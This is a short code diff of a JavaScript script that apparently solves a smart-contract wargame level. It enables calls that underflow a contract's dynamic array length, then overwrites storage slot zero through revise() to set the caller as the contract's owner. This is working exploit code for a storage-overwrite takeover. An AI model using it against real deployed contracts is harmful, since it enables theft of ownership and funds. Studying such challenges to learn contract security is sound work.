@@ -14,9 +14,6 @@ async function setContractOwner(contract, newOwnerAddr) {
     bytes = bytes.concat(Array.from(ethers.utils.arrayify(newOwnerAddr)));
 
     //set storage slot zero and verify owner
-    
-    console.log(bytes); 
-    console.log(arrayIndex);
     await contract.revise(arrayIndex, bytes);
 }
 
@@ -33,10 +30,10 @@ Runner.run(async (provider, owner) => {
     console.log("contract owner: ", await contract.owner()); 
 
     //make initial contact
-    //await contract.make_contact();
+    await contract.make_contact();
 
     //underflow the array to prepare it
-    //await contract.retract();
+    await contract.retract();
     
     //set new owner
     await setContractOwner(contract, owner.address); 
